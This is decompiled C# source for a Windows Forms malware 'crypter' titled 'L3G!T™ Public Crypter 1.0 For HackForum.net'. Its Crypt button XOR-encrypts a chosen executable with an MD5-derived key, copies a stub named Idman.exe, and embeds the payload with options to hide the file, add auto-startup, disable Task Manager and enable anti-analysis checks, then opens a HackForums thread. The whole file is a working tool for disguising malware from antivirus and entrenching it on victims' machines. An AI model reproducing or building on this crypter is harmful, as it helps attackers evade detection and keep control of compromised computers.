using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("GTheme1")]
	private Control4 _GTheme1;

	[AccessedThroughProperty("GButton2")]
	private Control2 _GButton2;

	[AccessedThroughProperty("GButton1")]
	private Control2 _GButton1;

	[AccessedThroughProperty("GButton3")]
	private Control2 _GButton3;

	[AccessedThroughProperty("GroupBox4")]
	private GroupBox _GroupBox4;

	[AccessedThroughProperty("GroupBox3")]
	private GroupBox _GroupBox3;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("CheckBox5")]
	private CheckBox _CheckBox5;

	[AccessedThroughProperty("CheckBox4")]
	private CheckBox _CheckBox4;

	[AccessedThroughProperty("CheckBox3")]
	private CheckBox _CheckBox3;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	private string string_0;

	private bool bool_0;

	private bool bool_1;

	private bool bool_2;

	private bool bool_3;

	internal virtual Control4 GTheme1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GTheme1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GTheme1 = value;
		}
	}

	internal virtual Control2 GButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _GButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = GButton2_Click;
			if (_GButton2 != null)
			{
				((Control)_GButton2).remove_Click(eventHandler);
			}
			_GButton2 = value;
			if (_GButton2 != null)
			{
				((Control)_GButton2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Control2 GButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = GButton1_Click;
			if (_GButton1 != null)
			{
				((Control)_GButton1).remove_Click(eventHandler);
			}
			_GButton1 = value;
			if (_GButton1 != null)
			{
				((Control)_GButton1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Control2 GButton3
	{
		[DebuggerNonUserCode]
		get
		{
			return _GButton3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = GButton3_Click;
			if (_GButton3 != null)
			{
				((Control)_GButton3).remove_Click(eventHandler);
			}
			_GButton3 = value;
			if (_GButton3 != null)
			{
				((Control)_GButton3).add_Click(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox4 = value;
		}
	}

	internal virtual GroupBox GroupBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox3 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual CheckBox CheckBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox5 = value;
		}
	}

	internal virtual CheckBox CheckBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox4 = value;
		}
	}

	internal virtual CheckBox CheckBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox3 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Expected O, but got Unknown
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		//IL_03d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e1: Expected O, but got Unknown
		//IL_0472: Unknown result type (might be due to invalid IL or missing references)
		//IL_047c: Expected O, but got Unknown
		//IL_05fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0604: Expected O, but got Unknown
		//IL_0689: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Expected O, but got Unknown
		//IL_0718: Unknown result type (might be due to invalid IL or missing references)
		//IL_0722: Expected O, but got Unknown
		//IL_07a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b1: Expected O, but got Unknown
		//IL_0836: Unknown result type (might be due to invalid IL or missing references)
		//IL_0840: Expected O, but got Unknown
		GTheme1 = new Control4();
		GButton3 = new Control2();
		GButton2 = new Control2();
		GroupBox4 = new GroupBox();
		RadioButton2 = new RadioButton();
		RadioButton1 = new RadioButton();
		GroupBox3 = new GroupBox();
		CheckBox5 = new CheckBox();
		CheckBox4 = new CheckBox();
		CheckBox3 = new CheckBox();
		CheckBox2 = new CheckBox();
		CheckBox1 = new CheckBox();
		GButton1 = new Control2();
		((Control)GTheme1).SuspendLayout();
		((Control)GroupBox4).SuspendLayout();
		((Control)GroupBox3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)GTheme1).set_BackColor(Color.FromArgb(41, 41, 41));
		((Control)GTheme1).get_Controls().Add((Control)(object)GButton3);
		((Control)GTheme1).get_Controls().Add((Control)(object)GButton2);
		((Control)GTheme1).get_Controls().Add((Control)(object)GroupBox4);
		((Control)GTheme1).get_Controls().Add((Control)(object)GroupBox3);
		((Control)GTheme1).get_Controls().Add((Control)(object)GButton1);
		((Control)GTheme1).set_Dock((DockStyle)5);
		((Control)GTheme1).set_ForeColor(SystemColors.ActiveCaption);
		GTheme1.Image_0 = null;
		Control4 gTheme = GTheme1;
		Point location = new Point(0, 0);
		((Control)gTheme).set_Location(location);
		GTheme1.Int32_0 = 29;
		((Control)GTheme1).set_Name("GTheme1");
		GTheme1.Boolean_0 = true;
		Control4 gTheme2 = GTheme1;
		Size size = new Size(350, 270);
		((Control)gTheme2).set_Size(size);
		((Control)GTheme1).set_TabIndex(0);
		GTheme1.Text = "L3G!T™ Public Crypter 1.0 For HackForum.net";
		GTheme1.Color_0 = Color.Fuchsia;
		((Control)GButton3).set_Font(new Font("Microsoft Sans Serif", 30f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		GButton3.Image_0 = null;
		Control2 gButton = GButton3;
		location = new Point(25, 202);
		((Control)gButton).set_Location(location);
		((Control)GButton3).set_Name("GButton3");
		GButton3.Boolean_0 = false;
		Control2 gButton2 = GButton3;
		size = new Size(300, 55);
		((Control)gButton2).set_Size(size);
		((Control)GButton3).set_TabIndex(2);
		GButton3.Text = "Crypt";
		((Control)GButton2).set_Font(new Font("Microsoft Sans Serif", 22f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		GButton2.Image_0 = null;
		Control2 gButton3 = GButton2;
		location = new Point(22, 54);
		((Control)gButton3).set_Location(location);
		((Control)GButton2).set_Name("GButton2");
		GButton2.Boolean_0 = false;
		Control2 gButton4 = GButton2;
		size = new Size(145, 65);
		((Control)gButton4).set_Size(size);
		((Control)GButton2).set_TabIndex(1);
		GButton2.Text = "Browse";
		((Control)GroupBox4).get_Controls().Add((Control)(object)RadioButton2);
		((Control)GroupBox4).get_Controls().Add((Control)(object)RadioButton1);
		((Control)GroupBox4).set_ForeColor(SystemColors.ActiveCaption);
		GroupBox groupBox = GroupBox4;
		location = new Point(16, 131);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox4).set_Name("GroupBox4");
		GroupBox groupBox2 = GroupBox4;
		size = new Size(156, 50);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox4).set_TabIndex(6);
		GroupBox4.set_TabStop(false);
		GroupBox4.set_Text("Encryption");
		((ButtonBase)RadioButton2).set_AutoSize(true);
		((Control)RadioButton2).set_Font(new Font("Microsoft Sans Serif", 9.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		RadioButton radioButton = RadioButton2;
		location = new Point(80, 20);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton2 = RadioButton2;
		size = new Size(50, 20);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton2).set_TabIndex(1);
		((ButtonBase)RadioButton2).set_Text("Rc4");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton1.set_Checked(true);
		((Control)RadioButton1).set_Font(new Font("Microsoft Sans Serif", 9.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		RadioButton radioButton3 = RadioButton1;
		location = new Point(21, 20);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton4 = RadioButton1;
		size = new Size(46, 20);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton1).set_TabIndex(0);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("Xor");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		((Control)GroupBox3).get_Controls().Add((Control)(object)CheckBox5);
		((Control)GroupBox3).get_Controls().Add((Control)(object)CheckBox4);
		((Control)GroupBox3).get_Controls().Add((Control)(object)CheckBox3);
		((Control)GroupBox3).get_Controls().Add((Control)(object)CheckBox2);
		((Control)GroupBox3).get_Controls().Add((Control)(object)CheckBox1);
		((Control)GroupBox3).set_ForeColor(SystemColors.ActiveCaption);
		GroupBox groupBox3 = GroupBox3;
		location = new Point(190, 42);
		((Control)groupBox3).set_Location(location);
		((Control)GroupBox3).set_Name("GroupBox3");
		GroupBox groupBox4 = GroupBox3;
		size = new Size(144, 137);
		((Control)groupBox4).set_Size(size);
		((Control)GroupBox3).set_TabIndex(5);
		GroupBox3.set_TabStop(false);
		GroupBox3.set_Text("Other Options");
		((ButtonBase)CheckBox5).set_AutoSize(true);
		((Control)CheckBox5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox checkBox = CheckBox5;
		location = new Point(14, 113);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox5).set_Name("CheckBox5");
		CheckBox checkBox2 = CheckBox5;
		size = new Size(94, 19);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox5).set_TabIndex(4);
		((ButtonBase)CheckBox5).set_Text("Enable Antis");
		((ButtonBase)CheckBox5).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox4).set_AutoSize(true);
		((Control)CheckBox4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox checkBox3 = CheckBox4;
		location = new Point(14, 90);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox4).set_Name("CheckBox4");
		CheckBox checkBox4 = CheckBox4;
		size = new Size(126, 19);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox4).set_TabIndex(3);
		((ButtonBase)CheckBox4).set_Text("Disable Task-Mng");
		((ButtonBase)CheckBox4).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		((Control)CheckBox3).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox checkBox5 = CheckBox3;
		location = new Point(14, 67);
		((Control)checkBox5).set_Location(location);
		((Control)CheckBox3).set_Name("CheckBox3");
		CheckBox checkBox6 = CheckBox3;
		size = new Size(92, 19);
		((Control)checkBox6).set_Size(size);
		((Control)CheckBox3).set_TabIndex(2);
		((ButtonBase)CheckBox3).set_Text("Auto Startup");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		((Control)CheckBox2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox checkBox7 = CheckBox2;
		location = new Point(14, 44);
		((Control)checkBox7).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox8 = CheckBox2;
		size = new Size(75, 19);
		((Control)checkBox8).set_Size(size);
		((Control)CheckBox2).set_TabIndex(1);
		((ButtonBase)CheckBox2).set_Text("Hide File");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		((Control)CheckBox1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox checkBox9 = CheckBox1;
		location = new Point(14, 21);
		((Control)checkBox9).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox10 = CheckBox1;
		size = new Size(73, 19);
		((Control)checkBox10).set_Size(size);
		((Control)CheckBox1).set_TabIndex(0);
		((ButtonBase)CheckBox1).set_Text("Eof Data");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		GButton1.Image_0 = null;
		Control2 gButton5 = GButton1;
		location = new Point(320, 4);
		((Control)gButton5).set_Location(location);
		((Control)GButton1).set_Name("GButton1");
		GButton1.Boolean_0 = false;
		Control2 gButton6 = GButton1;
		size = new Size(25, 23);
		((Control)gButton6).set_Size(size);
		((Control)GButton1).set_TabIndex(0);
		GButton1.Text = "X";
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(350, 270);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)GTheme1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)GTheme1).ResumeLayout(false);
		((Control)GroupBox4).ResumeLayout(false);
		((Control)GroupBox4).PerformLayout();
		((Control)GroupBox3).ResumeLayout(false);
		((Control)GroupBox3).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void GButton1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void GButton2_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_Filter("Executables *.exe|*.exe");
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			string_0 = ((FileDialog)val).get_FileName();
		}
		if (Operators.CompareString(string_0, "", false) != 0)
		{
			GButton2.Text = "Loaded";
			((Control)GButton2).set_ForeColor(Color.Green);
		}
	}

	private void GButton3_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		SaveFileDialog val = new SaveFileDialog();
		((FileDialog)val).set_DefaultExt("exe");
		((FileDialog)val).set_Filter("Executable Files (*.Exe)|*.Exe");
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
		}
		if (CheckBox2.get_Checked())
		{
			bool_0 = true;
		}
		else
		{
			bool_0 = false;
		}
		if (CheckBox3.get_Checked())
		{
			bool_1 = true;
		}
		else
		{
			bool_1 = false;
		}
		if (CheckBox4.get_Checked())
		{
			bool_2 = true;
		}
		else
		{
			bool_2 = false;
		}
		if (CheckBox5.get_Checked())
		{
			bool_3 = true;
		}
		else
		{
			bool_3 = false;
		}
		FileSystem.FileOpen(1, string_0, (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
		string string_ = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref string_, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		File.Copy(Application.get_StartupPath() + "\\Idman.exe", ((FileDialog)val).get_FileName());
		string s = "FileLife" + method_0(string_, "/@--L3G!T™@--/") + "FileLife" + Conversions.ToString(bool_0) + "FileLife" + Conversions.ToString(bool_1) + "FileLife" + Conversions.ToString(bool_2) + "FileLife" + Conversions.ToString(bool_3);
		byte[] bytes = Encoding.Default.GetBytes(s);
		Class0.smethod_1(((FileDialog)val).get_FileName(), bytes, Conversions.ToInteger("420"));
		GButton3.Text = "Crypted";
		((Control)GButton3).set_ForeColor(Color.Green);
		MessageBox.Show("File Crypted", "Done");
		MessageBox.Show("Please post Your Review", "Done");
		Process.Start("http://www.hackforums.net/showthread.php?tid=1375024");
	}

	public string method_0(string string_1, string string_2)
	{
		StringBuilder stringBuilder = new StringBuilder();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_2));
		checked
		{
			int num = string_1.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i++)
			{
				string text = Conversion.Hex(Strings.Asc(string_1[i]) ^ array[num2]);
				if (text.Length == 1)
				{
					text = "0" + text;
				}
				stringBuilder.Append(text);
				num2 = ((num2 != string_2.Length - 1) ? (num2 + 1) : 0);
			}
			return stringBuilder.ToString();
		}
	}
}
